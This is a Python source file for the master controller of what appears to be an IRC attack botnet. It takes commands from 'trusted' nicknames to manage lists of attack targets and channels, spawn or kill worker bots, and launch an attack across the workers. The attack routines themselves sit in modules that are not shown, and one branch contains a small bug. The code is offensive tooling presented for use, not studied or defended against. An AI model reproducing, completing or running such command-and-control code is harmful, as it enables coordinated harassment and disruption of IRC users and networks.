#!/bin/python

import hashlib
import random
import socket
import ssl
import string
import threading
import time

import eventnotifier
import irctargetedsocket
import ircworker

class IRCMaster(irctargetedsocket.IRCTargetedSocket):
	def __init__(self, server, port=6667, proxy=None, proxy_port=None, thread_count=1,
		     channels=[], attack_names=[], ignore_names=[], trusted_names=[],
		     ipv6=False, ssl=False, vhost=None, nick=None, password=None):

		irctargetedsocket.IRCTargetedSocket.__init__(self, server, port, proxy,
							     proxy_port, channels, attack_names,
							     ignore_names, trusted_names, ipv6,
							     ssl, vhost, nick, password)

		self.setNotifier(eventnotifier.EventNotifier())
		self.getNotifier().subscribe(self)

		self.setThreadCount(thread_count)
		self.setWorkers([])

		self.setContext("camila")
		self.getIgnoreNames().append(self.getNickname())
		self.sendStatus(vars(self))

		self.commands = {
			"-a" : ["add", "remove", "list"], # Attack Names
			"-c" : ["add", "remove", "list"], # Attack Channels
			"-g" : [], # Generate workers
			"-i" : ["add", "remove", "list"], # Ignore Names
			"-k" : [], # Kill workers
			"-s" : [], # Status,
			"-T" : ["add", "remove", "list"], # Trusted Names
			"--attack" : [], # attack
			"--stop" : [] # Stop attack
		}
	
	def event(self, line):
		super(IRCMaster, self).event(line)

		args = line.split()

		# Exception and code handling
		c = self.getCodes()
		if args[1] in c:
			s = c[args[1]]

			# Server connected
			if s  == "RPL_WELCOME":
				for name in self.getTrustedNames():
					self.sendMessage(name, "I am the master")

				ignore_names = self.getIgnoreNames()				
				for worker in self.getWorkerNames():
					ignore_names.append(worker)

	def processCommand(self, target, message):
		super(IRCMaster, self).processCommand(target, message)

		command = message.split()
		t = self.getTrustedNames()

		if t == None or t == []:
			return	

		if target in t and command[0] == self.getContext() and command[1] in self.getCommands():
			c = self.getCommands()

			# Attack Names
			if command[1] == "-a":
				l = self.getAttackNames()

				# Add attack names
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(0, target, names)
					self.listNames(target, "attack_names", l)
				
				# Remove attack names
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(1, target, names)
					self.listNames(target, "attack_names", l)

				# List attack names
				elif command[2] == "list":
					self.listNames(target, "attack_names", self.getAttackNames())

			# Ignore Names
			elif command[1] == "-i":
				l = self.getIgnoreNames()

				# Add ignore names
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(3, target, names)
					self.listNames(target, "ignore_names", l)
				
				# Remove ignore names
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(4, target, names)
					self.listNames(target, "ignore_names", l)

				# List ignore names
				elif command[2] == "list":
					self.listNames(target, "ignore_names", self.getIgnoreNames())

			# Trusted Names
			elif command[1] == "-T":
				l = self.getTrustedNames()

				# Add trusted names
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(6, target, names)
					self.listNames(target, "trusted_names", l)
				
				# Remove trusted names
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(7, target, names)
					self.listNames(target, "trusted_names", l)

				# List trusted names
				elif command[2] == "list":
					self.listNames(target, "trusted_names", self.getTrustedNames())

			# Attack Channels
			elif command[1] == "-c":
				l = self.getChannels()

				# Add attack channels
				if command[2] == "add":
					names = command[3:]
					self.getNotifier().publish(9, target, names)
					self.listNames(target, "channels", l)

				# Remove attack channels
				elif command[2] == "remove":
					names = command[3:]
					self.getNotifier().publish(10, target, names)
					self.listNames(target, "channels", l)

				# List attack channels
				elif command[2] == "list":
					self.getNotifier().publish(11, target, names)

			# Kill workers
			elif command[1] == "-k":
				names = command[2:]
				if names == []:
					names = self.getWorkerNames()

				self.getNotifier().publish(12, target, names)
			
				
			# Status
			elif command[1] == '-s':
				self.listNames(target, "attack_names", self.getAttackNames())
				self.listNames(target, "ignore_names", self.getIgnoreNames())
				self.listNames(target, "trusted_names", self.getTrustedNames())
				self.listNames(target, "channels", self.getChannels())
				self.listNames(target, "workers", self.getWorkerNames())

			elif command[1] == "--stop":
				pass

			elif command[1] == "--attack":
				# queue the attack
				# set attacking flag
				# run attack
				self.getNotifier().publish(14, "", command[2:])

		else:
			pass


	def inform(self, event, target, data):
		super(IRCMaster, self).inform(event, target, data)

		if event == 12: #KILL_WORKERS
			if target == None or target == self.getNickname():
				self.quit()
			else:
				self.listRemove(data, self.getWorkerNames())

				for w in self.getWorkers():
					if w.getNickname() in data:
						self.getWorkers().remove(w)
						w.quit()

	def getThreadCount(self):
		return self.thread_count

	def setThreadCount(self, thread_count):
		self.thread_count = thread_count

	def getWorkers(self):
		return self.workers

	def setWorkers(self, workers):
		self.workers = workers

		for w in self.workers:
			w.setNotifier(self.getNotifier())
			w.getNotifier().subscribe(w)

	def getWorkerNames(self):
		names = []
		for w in self.getWorkers():
			names.append(w.getNickname())
		return names
